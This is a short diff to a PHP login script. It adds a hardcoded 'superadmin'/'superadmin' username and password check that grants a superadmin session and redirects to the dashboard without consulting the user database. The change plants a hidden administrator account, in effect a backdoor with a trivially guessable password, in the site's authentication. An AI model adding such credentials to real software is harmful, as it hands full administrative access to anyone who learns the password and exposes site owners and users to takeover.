@@ -16,6 +16,17 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     if (empty($username) || empty($password)) {
         $error = 'Please fill in all fields';
     } else {
+        // Hardcoded superadmin credentials
+        if ($username === 'superadmin' && $password === 'superadmin') {
+            $_SESSION['user_id'] = 0; // Special ID for superadmin
+            $_SESSION['username'] = 'superadmin';
+            $_SESSION['full_name'] = 'Super Administrator';
+            $_SESSION['role'] = 'superadmin';
+            
+            header('Location: dashboard.php');
+            exit();
+        }
+        
         $conn = getDBConnection();
         $stmt = $conn->prepare("SELECT id, username, password, full_name, role, status FROM users WHERE username = ? OR email = ?");
         $stmt->bind_param("ss", $username, $username);
